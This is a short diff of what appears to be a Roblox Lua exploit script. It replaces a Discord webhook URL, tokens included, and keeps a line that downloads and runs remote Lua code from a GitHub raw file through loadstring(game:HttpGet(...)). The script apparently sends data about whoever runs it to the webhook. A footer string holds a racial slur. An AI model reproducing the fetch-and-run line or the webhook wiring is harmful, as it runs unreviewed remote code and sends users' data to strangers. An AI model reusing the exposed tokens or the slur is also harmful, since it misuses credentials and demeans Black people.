@@ -11,7 +11,7 @@ getgenv().FieldText = ""
 getgenv().FooterText = "black nigga"
 getgenv().FooterUrl = ""
 
-getgenv().Webhook = "https://discord.com/api/webhooks/1214579523874717776/rknNrO1JIH7jqyuS3mVYH1qUZ-f13o8OM0PcHu76jBuktuTNcXelyq7Pju1bfGMIbBYT"
+getgenv().Webhook = "https://discord.com/api/webhooks/1235294525304606760/jyZGKFnVlM9YHEHrEIDJHevz0_UajEd1CditRpoYbR7AHI2v2HM741vFQjlupvghl2Ma"
 
 coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
 end)()
